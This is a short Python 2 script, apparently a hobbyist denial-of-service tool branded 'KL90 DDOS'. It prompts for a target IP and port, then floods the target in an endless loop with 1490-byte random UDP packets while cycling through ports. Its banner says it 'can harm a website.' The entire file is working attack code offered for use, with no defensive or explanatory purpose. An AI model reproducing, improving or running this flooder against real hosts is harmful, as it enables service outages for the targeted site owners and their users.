import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet KL90 DDOS")
print
print "Author   : 333Xsx"
print "You Tube : XCSC PROGRAM"
print "DEVIL DDOS"
print "==================Anonymous JABAR=========="
print
ip = raw_input("IP  : ")
port = input("Port  : ")

os.system("clear")
os.system("figlet KL90 can harm a website.")
print "[   ] 0% "
time.sleep(5)
print "[=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+] 100%"
time.sleep(13)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "packet to %s throught port:%s"%(ip,port)
     if port == 65534:
       port = 1
